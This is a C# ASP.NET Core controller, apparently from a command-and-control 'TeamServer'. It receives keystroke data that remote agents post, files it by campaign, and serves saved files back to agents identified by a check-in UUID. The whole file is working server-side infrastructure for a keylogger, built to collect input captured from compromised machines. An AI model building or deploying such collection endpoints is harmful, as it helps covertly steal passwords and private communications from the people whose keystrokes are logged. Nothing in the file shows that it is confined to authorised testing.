using Microsoft.AspNetCore.Mvc;
using TeamServer.Interface;
using TeamServer.Repositories;

namespace TeamServer.Controllers;

[ApiController]
[Route(Routes.Keylogger)]
public sealed class KeyloggerController : ControllerBase
{
    private readonly IKeyloggerService _keyloggerService;
    private readonly AgentRepository _agentRepository;

    public KeyloggerController(IKeyloggerService keyloggerService, AgentRepository agentRepository)
    {
        _keyloggerService = keyloggerService;
        _agentRepository = agentRepository;
    }

    [HttpPost("data")]
    public async Task<IActionResult> PostKeyloggerData([FromQuery] string agentKey, [FromBody] KeyloggerData keyloggerData)
    {
        var agent = await _agentRepository.GetAgentByCheckInUUID(agentKey);
        if (agent is null || keyloggerData is null || keyloggerData.Data is null)
        {
            return BadRequest("Keylogger data is required");
        }

        var result = await _keyloggerService.SaveDataAsync(agent.CampaignID, keyloggerData.Data);
        return result.IsSuccess ? Ok(new
        {
            message = "Keylogger data saved successfully",
            filename = result.Response
        }) : BadRequest(result.Error);
    }

    [HttpGet("download/{filename}")]
    public async Task<IActionResult> DownloadFile(string filename, [FromQuery] string agentKey)
    {
        var agent = await _agentRepository.GetAgentByCheckInUUID(agentKey);
        if (agent is null)
            return NotFound();
        var result = await _keyloggerService.GetFileAsync(agent.CampaignID, filename);

        return result.IsSuccess
            ? File(result.Response!, "application/octet-stream", Path.GetFileName(filename))
            : NotFound(result.Error);
    }
}

public sealed class KeyloggerData
{
    public string? Data { get; set; }
}
